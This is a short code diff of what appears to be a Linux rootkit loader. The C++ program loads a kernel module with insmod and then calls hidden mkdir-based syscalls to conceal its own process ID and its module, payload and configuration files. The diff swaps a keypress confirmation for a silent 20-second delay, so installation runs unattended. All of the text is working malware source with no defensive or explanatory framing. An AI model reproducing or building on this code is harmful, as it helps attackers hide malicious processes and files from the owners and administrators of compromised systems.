@@ -12,13 +12,11 @@
 
 using namespace std;
 
-// path = program's pid
 int hidepid(string path) {
 	path = string(secret_api_hidepid) + path;
 	return syscall(SYS_mkdir, path.c_str());
 }
 
-// path = ko_name, payload_name, conf_name
 int hidepath(string path) {
 	return syscall(SYS_mkdir, (string(secret_api_hidepath) + path).c_str());
 }
@@ -30,11 +28,9 @@ string getPID() {
 	return temp.str();
 }
 
-int main() {
-	// Delay installation of the LKM until a keypress occurs.	
-	printf("Press key to install module...");
-	getchar();
 
+int main() {
+	sleep(20);
 	system((string("insmod ") + secret_ko_name).c_str());
 	cout << hidepid(getPID()) << endl;
 	cout << hidepath(secret_ko_name) << endl;
